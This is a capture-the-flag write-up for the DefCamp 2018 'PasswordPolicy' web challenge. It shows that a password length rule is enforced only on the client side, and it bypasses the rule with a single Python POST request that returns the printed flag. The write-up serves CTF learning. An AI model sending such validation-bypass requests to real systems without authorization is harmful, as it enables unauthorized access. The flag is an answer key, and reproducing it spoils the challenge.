#PasswordPolicy
### (Junior - 1pts)
> Can you guess this extreme password?

> Target: [https://password-policy.dctfq18.def.camp/](password-policy.dctfq18.def.camp.html)
------

On checking link's page-source there is an internal JavaScript

It checks the value in input of Password for length to be greater then 1337

And, the form which contains the inputs is making a post call to the same page itself

Hence, appropiate first step seems to be sending a post call with lesser length to check whether is it just client side validation or is there any on server
```
$python
>> import requests
>> requests.post('https://password-policy.dctfq18.def.camp/', data={ 'user':'admin@leftover.dctf', 'pass':'password'}).text
u'DCTF{db95ace20ae3972f87d758a3724142ae93735c442a8482f9717fe4a9bb94d337}'
```
After sending above data we receive our flag there itself

------
Flag: DCTF{db95ace20ae3972f87d758a3724142ae93735c442a8482f9717fe4a9bb94d337}
